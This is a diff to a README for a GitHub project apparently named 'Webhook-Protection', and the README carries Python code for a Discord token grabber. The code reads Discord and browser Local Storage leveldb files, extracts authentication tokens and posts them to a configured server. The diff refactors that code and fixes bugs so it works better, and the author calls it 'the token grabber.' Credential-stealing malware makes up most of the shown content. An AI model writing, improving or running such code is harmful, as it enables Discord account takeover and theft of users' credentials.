@@ -20,34 +20,34 @@ import re
 import requests
 
 # configuration
-API_IP = '127.0.0.1' # change to your server IP
+API_IP = '127.0.0.1'  # change to your server IP
 API_PORT = 5001  # change to your API port defined in config.json
 SECRET = 'aSPQq7gE86coXJbuikEbf9IEkablz6Rw' # change to your secret defined in config.json
 
-# constants
-API_URL = f'http://{API_IP}:{API_PORT}/grab?secret={SECRET}&token=%s'
-LOCAL = os.getenv('LOCALAPPDATA')
-ROAMING = os.getenv('APPDATA')
-PATHS = {
-    'Discord': ROAMING + '\\Discord',
-    'Discord Canary': ROAMING + '\\discordcanary',
-    'Discord PTB': ROAMING + '\\discordptb',
-    'Google Chrome': LOCAL + '\\Google\\Chrome\\User Data\\Default',
-    'Opera': ROAMING + '\\Opera Software\\Opera Stable',
-    'Brave': LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
-    'Yandex': LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Default'
+# set paths to where tokens are stored
+localappdata = os.getenv('LOCALAPPDATA')
+roaming = os.getenv('APPDATA')
+paths = {
+    'Discord': os.path.join(roaming, 'Discord'),
+    'Discord Canary': os.path.join(roaming, 'DiscordCanary'),
+    'Discord PTB': os.path.join(roaming, 'DiscordPTB'),
+    'Google Chrome': os.path.join(localappdata, 'Google', 'Chrome', 'User Data', 'Default'),
+    'Opera': os.path.join(roaming, 'Opera Software', 'Opera Stable'),
+    'Brave': os.path.join(localappdata, 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default'),
+    'Yandex': os.path.join(localappdata, 'Yandex', 'YandexBrowser', 'User Data', 'Default')
 }
 
+# grab tokens
 tokens = []
 
-for platform, path in PATHS.items():
+for platform, path in paths.items():
+    path = os.path.join(path, 'Local Storage', 'leveldb')
+
     if os.path.exists(path) is False:
         continue
 
-    path = os.path.join(path, 'Local Storage', 'leveldb')
-
     for item in os.listdir(path):
-        if item[-4:] in ('.log', 'ldb') is False:
+        if (item[-4:] in ('.log', '.ldb')) is False:
             continue
 
         with open(os.path.join(path, item), errors='ignore', encoding='utf-8') as file:
@@ -65,12 +65,17 @@ for platform, path in PATHS.items():
 
                 tokens.append(token)
 
-for token in tokens:
-    try:
-        res = requests.get(API_URL % token)  # sends token to your API
-    except:
-        pass
+# send tokens to the webhook protection API
+try:
+    data = {'secret': SECRET, 'tokens': tokens}
+
+    # note that using json=data, requests module automatically sets the Content-Type header to application/json
+    res = requests.post(f'http://{API_IP}:{API_PORT}/grab', json=data)
+except:
+    pass
 ```
+
+Don't judge the token grabber. I made it simple to understand, not efficient : P
 
 ## Requirements
 
@@ -83,7 +88,7 @@ for token in tokens:
 1. Install repository via `$ git clone https://github.com/ecriminal/Webhook-Protection.git`
 2. Install required modules using `$ pip install -r requirements.txt`
 3. Edit `config.json` file
-4. Start webserver via `$ py main.py`
+4. Start webserver via `$ py main.py` (It's recommened to set up a production WSGI server)
 
 ## TODO
 
